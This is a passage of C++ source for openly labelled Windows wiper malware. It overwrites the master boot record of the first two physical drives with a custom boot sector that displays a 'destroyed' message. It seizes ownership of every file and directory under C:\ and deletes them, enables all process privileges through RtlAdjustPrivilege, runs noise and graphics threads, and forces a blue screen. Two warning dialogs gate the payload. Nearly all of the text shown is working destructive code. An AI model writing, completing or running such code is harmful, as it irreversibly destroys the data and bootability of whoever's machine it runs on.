    GetVolumePathNamesForVolumeNameA(str, str2, 4, &a);
    cout << str2 << endl;
    while (FindNextVolumeA(hVol, str, MAX_PATH)){
        GetVolumePathNamesForVolumeNameA(str, str2, 4,&a);
        MBRWiper(str2, (unsigned char*) malloc(512));
    }
    CloseHandle(hVol);
	
	unsigned char MasterBootRecord[512] = {
		0xE9, 0x00, 0x00, 0xB4, 0x0E, 0xB0, 0x59, 0xCD, 0x10, 0xF4, 0xB0, 0x6F,
		0xCD, 0x10, 0xF4, 0xB0, 0x75, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10,
		0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0, 0x63, 0xCD, 0x10, 0xF4, 0xB0,
		0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x6D, 0xCD, 0x10, 0xF4, 0xB0, 0x70, 0xCD,
		0x10, 0xF4, 0xB0, 0x75, 0xCD, 0x10, 0xF4, 0xB0, 0x74, 0xCD, 0x10, 0xF4,
		0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10, 0xF4, 0xB0, 0x20,
		0xCD, 0x10, 0xF4, 0xB0, 0x68, 0xCD, 0x10, 0xF4, 0xB0, 0x61, 0xCD, 0x10,
		0xF4, 0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0,
		0x62, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD,
		0x10, 0xF4, 0xB0, 0x6E, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4,
		0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x73,
		0xCD, 0x10, 0xF4, 0xB0, 0x74, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10,
		0xF4, 0xB0, 0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x79, 0xCD, 0x10, 0xF4, 0xB0,
		0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD,
		0x10, 0xF4, 0xB0, 0x62, 0xCD, 0x10, 0xF4, 0xB0, 0x79, 0xCD, 0x10, 0xF4,
		0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0, 0x50, 0xCD, 0x10, 0xF4, 0xB0, 0x72,
		0xCD, 0x10, 0xF4, 0xB0, 0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x6A, 0xCD, 0x10,
		0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x63, 0xCD, 0x10, 0xF4, 0xB0,
		0x74, 0xCD, 0x10, 0xF4, 0xB0, 0x31, 0xCD, 0x10, 0xF4, 0xB0, 0x21, 0xCD,
		0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xE9, 0x00, 0x00, 0xB4, 0x06,
		0xB0, 0x00, 0xFE, 0xC7, 0xB5, 0x00, 0xB1, 0x00, 0xB6, 0x19, 0xB2, 0x50,
		0xCD, 0x10, 0xE9, 0xED, 0xFF, 0x50, 0x52, 0xB9, 0x07, 0x00, 0xBA, 0x40,
		0x42, 0xB8, 0x86, 0x00, 0xCD, 0x15, 0x5A, 0x58, 0xC3, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
	};
	MBRWiper("PhysicalDrive0",&MasterBootRecord[0]);
	MBRWiper("PhysicalDrive1",&MasterBootRecord[0]);
}
DWORD WINAPI ByteBeat(LPVOID){
	while(1){
		sound1(); 	Sleep(30000);
		sound2(); 	Sleep(30000);
		sound11();	Sleep(30000);
	}
}
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
BOOL SetFileOwnership(const wchar_t* filename) {
    SECURITY_DESCRIPTOR security;
    BOOL retValue = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
		PTOKEN_USER pUser = (PTOKEN_USER)malloc(dwSize);
        if (pUser && GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize)) {
			// Get the security descriptor for the file
			if (GetFileSecurityW(filename, OWNER_SECURITY_INFORMATION, &security, 0, NULL)) {
				// Set the SID to be the new owner (replace with an actual SID)
				// Example: ConvertStringSidToSid(L"S-1-5-21-1234567890-1234567890-1234567890-1000", &sid);
				if (SetSecurityDescriptorOwner(&security, pUser->User.Sid, NULL)) {
					// Save the updated security descriptor
					retValue = SetFileSecurityW(filename, OWNER_SECURITY_INFORMATION, &security);
				}
			}

			if (&security)
				LocalFree(&security);
        }
        CloseHandle(hToken);
    }

    return retValue;
}
void del_file(const wchar_t* filePath){
    BOOL success = SetFileAttributes(filePath, FILE_ATTRIBUTE_NORMAL);
	SetFileOwnership(filePath);
        // Attributes set successfully
        // Now proceed with deletion (if needed)
        DeleteFile(filePath); // Use the DeleteFileA function to delete the file
}

void printdir(const wchar_t* dir) {
    WIN32_FIND_DATAW data;
    wstring fullPath = dir;
    fullPath += L"*"; // Corrected the wildcard format

    HANDLE hFindFile = FindFirstFileW(fullPath.c_str(), &data);

    if (hFindFile != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(data.cFileName, L".") != 0 && wcscmp(data.cFileName, L"..") != 0) {
                wstring subPath = dir;
				subPath+= data.cFileName;

                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    subPath += L"\\";
                    printdir(subPath.c_str());
					SetFileAttributes(subPath.c_str(), FILE_ATTRIBUTE_NORMAL);
					SetFileOwnership(subPath.c_str());
					RemoveDirectory(subPath.c_str());
                }
				else{
					del_file(subPath.c_str());
				}
            }
        } while (FindNextFileW(hFindFile, &data));
        FindClose(hFindFile);
    }
}

DWORD WINAPI DelFile(LPVOID)
{
    const wchar_t* directoryPath = L"C:\\"; // Search for all files in C:\

    printdir(directoryPath);
	return 0;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR    lpCmdLine,
                     int       nCmdShow)
{
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	for (int i = 0; i < 36; i++){
		BYTE enabled = FALSE;
		RtlAdjustPrivilege(i, TRUE, FALSE, &enabled);
	}
	HANDLE hP =GetCurrentProcess();
	SetProcessPriorityBoost(hP, TRUE);
	SetPriorityClass(hP, REALTIME_PRIORITY_CLASS);
	if (MessageBox(NULL, L"THIS IS NOT A NORMAL PROGRAM. \nTHIS IS A MALWARE.\nDo you want to destroy the system? I'm not responsible when you click 'OK'. Better click 'Cancel' and remove this file immediately.", L"FIRST WARNING!", MB_YESNO | MB_ICONEXCLAMATION)==IDYES){
		if (MessageBox(NULL, L"Again: do you want to destroy the system? I'm not responsible when you click 'OK'. Better click 'Cancel' and remove this file immediately. \n\nTHIS IS THE LAST WARNING!\nONCE YOU CLICK THE 'OK' BUTTON, YOU WILL DAMAGE YOUR OWN SYSTEM!", L"THIS IS THE LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION)==IDYES){
			WipeMBRs();
			DisableFunctional();
			HANDLE t[3]={CreateThread(0,0,GDI,0,0,0),CreateThread(0,0,ByteBeat,0,0,0),CreateThread(0,0,DelFile,0,0,0)};
			for (int index=0;index < 3;index++)SetThreadPriority(t[index],REALTIME_PRIORITY_CLASS);
			WaitForMultipleObjects(3, &t[0], FALSE, 1 << 30);
			BSOD();
		}
	}
}